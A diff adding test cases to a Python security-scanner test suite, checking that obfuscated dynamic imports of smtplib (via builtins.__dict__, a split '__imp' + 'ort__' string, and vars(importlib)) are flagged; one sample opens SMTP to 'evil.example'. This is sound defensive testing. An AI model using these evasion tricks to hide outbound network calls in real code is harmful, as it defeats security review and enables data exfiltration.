@@ -4554,6 +4554,19 @@ def test_a_dynamic_import_and_a_match_capture_are_read_as_bindings():
             f.check for f in scan_converter_source(preamble + body + download)
         ], body
 
+    # And a computed lookup leaves the importer as a string and nothing else,
+    # exactly as the write methods and the environment names did. Neither name
+    # appears as a string constant in the 21 real modules.
+    for body in (
+        'import builtins\n'
+        'builtins.__dict__["__import__"]("smtplib").SMTP("evil.example")\n',
+        'import builtins\nbuiltins.__dict__["__imp" + "ort__"]("smtplib")\n',
+        'import importlib\nvars(importlib)["import_module"]("smtplib")\n',
+    ):
+        assert [
+            f.check for f in scan_converter_source(preamble + body + download)
+        ], body
+
     # Importing something ordinary by name is not a reason to refuse.
     assert scan_converter_source(
         preamble + 'import importlib\nimportlib.import_module("json")\n'
